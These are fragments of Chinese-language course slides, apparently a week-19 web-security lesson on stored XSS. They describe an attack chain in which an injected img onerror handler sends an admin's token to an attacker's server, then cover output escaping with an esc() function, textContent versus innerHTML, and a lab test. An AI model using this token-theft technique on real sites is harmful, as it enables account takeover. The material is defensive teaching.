            <a:ext cx="452902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攻擊鏈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① 客戶送出惡意訊息，存入資料庫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② 管理員開啟客服中心，訊息被塞進 innerHTML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③ onerror 執行，權杖被送到攻擊者伺服器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④ 攻擊者持該權杖，即為管理員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27909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為何比偷密碼更嚴重？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權杖可以直接使用，不必經過登入流程。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繞過密碼強度規則、繞過任何登入頁的保護。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而且是後台管理員的權杖，權限最大的那一個。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兩者比較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取得什麼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還需要什麼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密碼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還要能通過登入頁與額外驗證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直接放進 Header 就是管理員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防禦：所有進 innerHTML 的值都先跳脫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P.96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backoffice.js / ops.js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undefined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'&amp;amp;'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'&amp;lt;'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'&amp;gt;'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'&amp;quot;'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'/g,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#39;');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五個字元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&amp; 必須第一個換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角括號讓標籤失去意義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引號防止跳出屬性值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順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序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49549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使用方式：先跳脫再拼接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P.97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backoffice.js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innerHTML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'&lt;tr&gt;'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'&lt;td&gt;'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'&lt;/td&gt;'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'&lt;td&gt;'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'&lt;br&gt;&lt;span class="muted"&gt;'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'&lt;/span&gt;&lt;/td&gt;'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'&lt;/tr&gt;'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習慣的養成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每一個變數都包 esc()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包括看似安全的 email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少包一個就是一個洞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要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為何不乾脆全用 textContent？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P.98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兩種輸出方式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533689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textContent（最安全）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瀏覽器不解析 HTML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完全免疫 XSS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但只能放純文字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無法組合表格與標籤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59152"/>
            <a:ext cx="533689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359152"/>
            <a:ext cx="533689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innerHTML 加 esc()（本專案）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926080"/>
            <a:ext cx="500771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可組合 HTML 結構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需要紀律：每個變數都要包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漏一個就有洞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適合大量動態版面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71189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涵蓋範圍：不是只有後台要防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P.99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前台也顯示他人輸入，例如商品評價與客服回覆。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三支營運頁顯示客戶姓名與訂單資訊。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任何顯示他人輸入的地方都要防。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全站檢查清單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檔案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顯示的他人輸入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backoffice.js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聊天、會員、商品、訂單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ops.js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客戶姓名、信箱、商品名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index.html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商品名、評價內容、客服訊息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W19: 八大進階實作專題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區塊八：儲存型 XSS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實驗驗收：送出標籤應顯示為純文字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P.100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這是整個第 19 週的最後一項驗收。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成功的標準是什麼都沒發生，標籤原樣顯示。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若畫面出現破圖或跳出視窗，代表有一處沒跳脫。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以客戶身分在客服對話送出含 onerror 的 img 標籤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manager 開啟客服中心查看該訊息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確認顯示為純文字，沒有跳出視窗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同樣測試商品名稱與會員姓名欄位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